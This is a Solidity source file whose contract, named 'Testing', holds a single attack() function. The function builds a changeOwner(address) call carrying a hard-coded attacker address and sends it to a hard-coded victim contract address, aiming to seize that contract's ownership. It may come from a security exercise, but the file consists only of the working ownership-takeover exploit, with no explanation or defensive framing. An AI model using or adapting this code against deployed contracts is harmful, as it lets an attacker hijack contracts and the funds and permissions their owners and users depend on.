// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract Testing {
    function attack() public {
        address victimAddress = 0xd2700980C20672fD92968fCC8829afbAc3464B5d;
        address attackerAddress = 0x04dfa364501774Ffc8bEB3842de5F6ce866FEb4D;
        bytes memory payload = abi.encodeWithSignature(
            "changeOwner(address)",
            attackerAddress
        );
        (bool success, bytes memory returnData) = victimAddress.call(payload);
        require(success);
    }
}
